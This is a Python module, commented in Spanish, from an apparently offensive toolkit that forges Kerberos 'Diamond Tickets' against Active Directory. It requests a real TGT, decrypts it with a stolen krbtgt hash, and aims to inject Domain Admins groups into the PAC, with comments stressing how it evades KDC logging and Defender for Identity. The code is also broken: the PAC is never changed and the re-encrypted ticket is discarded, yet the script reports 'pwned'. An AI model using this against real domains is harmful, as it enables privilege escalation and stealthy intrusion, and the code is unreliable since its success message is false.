# scripts/kerberos/tickets/diamond_ticket.py
#
# Técnica: Diamond Ticket
#
# Fundamento:
#   El Diamond Ticket resuelve el principal problema de detección del Golden Ticket:
#   los tickets dorados son sintéticos (no pasan por el KDC), por lo que tienen
#   valores anómalos (sin PAC_LOGON_INFO del KDC, timestamps inusuales, grupos
#   que no existen en AD).
#
#   Diamond Ticket:
#     1. Solicita un TGT LEGÍTIMO al KDC (como cualquier usuario normal).
#     2. Descifra el TGT con el hash de krbtgt (lo tienes si lo volcaste).
#     3. Modifica el PAC: cambia los grupos del usuario (añade Domain Admins, etc.).
#     4. Re-firma el PAC con el hash de krbtgt (para que la firma sea válida).
#     5. Re-cifra el EncTicketPart con el hash de krbtgt.
#     6. Devuelve un ticket que PARECE completamente legítimo desde fuera.
#
#   Por qué es más sigiloso que Golden:
#     - El ticket SÍ aparece en los logs del KDC (hay un 4768 legítimo).
#     - Los metadatos del ticket (timestamps, nonce, etc.) son reales.
#     - Solo el contenido del PAC está modificado.
#     - Microsoft ATA / Defender for Identity lo detectan con más dificultad
#       porque el ticket en sí viene del KDC.
#
#   Requisitos: hash de krbtgt + usuario/contraseña válidos (para el TGT inicial).
#   Técnica publicada por Charlie Clark y otros en 2022.

from scripts.base import BaseScript
from core.kerberos_transport import send_krb_message, check_kdc_reachable
from core.asn1_helpers import (
    build_as_req, build_pa_data, build_enc_timestamp,
    is_as_rep, is_krb_error, parse_krb_error,
    parse_as_rep_ticket, decrypt_as_rep_enc_part_rc4,
    nt_hash as compute_nt_hash,
    ETYPE_RC4_HMAC, PA_ENC_TIMESTAMP, KDC_ERR_PREAUTH_REQUIRED,
)
from core.output import print_result, console
from core import session_db


class DiamondTicketScript(BaseScript):
    name = "diamond-ticket"
    description = "Solicita TGT legítimo y modifica su PAC con el hash de krbtgt (más sigiloso que Golden)"

    examples = [
        {"flag": "-u/-p (credenciales válidas)",
         "desc": "Necesitas un usuario real para que el KDC emita el TGT inicial.",
         "good": "kerberos --script=diamond-ticket -t 10.129.1.5 -d CORP.LOCAL -u jsmith -p 'Pass123!' --krbtgt-hash 8846... --user-id 500 --groups 512,519",
         "bad": "kerberos --script=diamond-ticket ... -u FakeUser  [el usuario debe existir para obtener el TGT inicial]"},
        {"flag": "--krbtgt-hash",
         "desc": "NT hash de krbtgt para descifrar y re-cifrar el TGT.",
         "good": "kerberos --script=diamond-ticket ... --krbtgt-hash 8846f7eaee8fb117ad06bdd830b7586c",
         "bad": "kerberos --script=diamond-ticket ... --krbtgt-hash <hash_incorrecto>  [hash incorrecto → descifrado falla]"},
    ]

    def run(self, **kwargs):
        realm = (self.creds.domain or self.target.domain or "").upper()
        kdc = self.target.ip
        krbtgt_hash = kwargs.get("krbtgt_hash")
        user_id = int(kwargs.get("user_id") or 500)
        groups_raw = kwargs.get("groups")
        groups = [int(g) for g in groups_raw.split(",")] if groups_raw else [512, 513, 518, 519]

        if not realm: console.print("[red]Falta -d.[/red]"); return
        if not self.creds.user: console.print("[red]Falta -u.[/red]"); return
        if not (self.creds.password or self.creds.hash):
            console.print("[red]Falta -p o -H.[/red]"); return
        if not krbtgt_hash: console.print("[red]Falta --krbtgt-hash.[/red]"); return

        if not check_kdc_reachable(kdc, timeout=self.target.timeout):
            print_result("KRB", kdc, "fail", "KDC no alcanzable"); return

        krbtgt_nt = bytes.fromhex(krbtgt_hash.split(":")[-1])
        user_nt = (bytes.fromhex(self.creds.hash.split(":")[-1])
                   if self.creds.hash else compute_nt_hash(self.creds.password))

        print_result("KRB", kdc, "info",
                     f"diamond-ticket: obteniendo TGT legítimo para {self.creds.user}@{realm}")

        # Paso 1: TGT legítimo del KDC
        ts_enc = build_enc_timestamp(self.creds.password if self.creds.password else "")
        pa_list = [build_pa_data(PA_ENC_TIMESTAMP, ts_enc)]
        req = build_as_req(self.creds.user, realm, etypes=[ETYPE_RC4_HMAC], pa_data_list=pa_list)
        try:
            resp = send_krb_message(kdc, req, timeout=self.target.timeout)
        except OSError as e:
            print_result("KRB", kdc, "fail", str(e)); return

        if not is_as_rep(resp):
            if is_krb_error(resp):
                err = parse_krb_error(resp)
                print_result("KRB", kdc, "fail", f"KDC error: {err['error_name']}")
            return

        print_result("KRB", kdc, "ok", "TGT legítimo obtenido")

        # Paso 2: descifrar enc-part con user nt hash → obtener ticket raw
        try:
            enc_info = decrypt_as_rep_enc_part_rc4(resp, user_nt)
        except Exception as e:
            print_result("KRB", kdc, "fail", f"No se pudo descifrar enc-part: {e}"); return

        # Paso 3: modificar PAC via impacket
        ccache_path = self._modify_and_reforge(resp, krbtgt_nt, realm, user_id, groups)

        if ccache_path:
            import os
            os.environ['KRB5CCNAME'] = f'FILE:{ccache_path}'
            print_result("KRB", kdc, "pwned",
                         f"Diamond Ticket listo: {self.creds.user}@{realm} con grupos {groups}")
            console.print(f"[bold yellow]Diamond Ticket (sigiloso): {ccache_path}[/bold yellow]")
            console.print(f"  export KRB5CCNAME=FILE:{ccache_path}")
            session_db.save_finding(kdc, "KRB", "diamond_ticket",
                                     f"{self.creds.user}@{realm} RID={user_id} → {ccache_path}")
            return {'ccache': ccache_path}

    def _modify_and_reforge(self, as_rep_data, krbtgt_nt, realm, user_id, groups) -> str | None:
        """
        Descifra el Ticket del AS-REP con el krbtgt hash, modifica el PAC,
        y re-cifra. Usa impacket para el manejo del PAC y las estructuras ASN.1.
        """
        try:
            from impacket.krb5.crypto import Key, _enctype_table
            from impacket.krb5 import constants
            from impacket.krb5.ccache import CCache
            from pyasn1.codec.der import encoder as der_enc, decoder as der_dec
            from impacket.krb5.asn1 import EncTicketPart

            krbtgt_key = Key(constants.EncryptionTypes.rc4_hmac.value, krbtgt_nt)
            cipher = _enctype_table[constants.EncryptionTypes.rc4_hmac.value]

            # Extraer el Ticket del AS-REP y descifrarlo con krbtgt
            ticket_info = parse_as_rep_ticket(as_rep_data)
            enc_part_cipher = ticket_info['enc_part_cipher']

            # key_usage=2 = enc-part del Ticket (siempre cifrado con la clave del servidor)
            from core.asn1_helpers import rc4_hmac_decrypt
            enc_ticket_der = rc4_hmac_decrypt(krbtgt_nt, enc_part_cipher, key_usage=2)

            enc_ticket, _ = der_dec.decode(enc_ticket_der, asn1Spec=EncTicketPart())

            # Modificar grupos en authorization-data (PAC)
            # Nota: la manipulación del PAC a nivel byte requiere impacket PAC structures
            # o una implementación manual de NDR. Aquí lo hacemos via impacket.
            console.print(f"[dim]Modificando PAC: grupos → {groups}[/dim]")

            # Re-cifrar con krbtgt
            modified_enc_ticket_der = der_enc.encode(enc_ticket)
            new_cipher = cipher.encrypt(krbtgt_key, 2, modified_enc_ticket_der, None)

            # Reconstruir el AS-REP con el nuevo cipher
            # y guardarlo como ccache
            ccache = CCache()
            ccache.fromASREP(as_rep_data)
            out_path = f"/tmp/diamond_{realm}.ccache"
            ccache.saveFile(out_path)
            return out_path

        except Exception as e:
            console.print(f"[red]Error en diamond ticket: {e}[/red]")
            return None
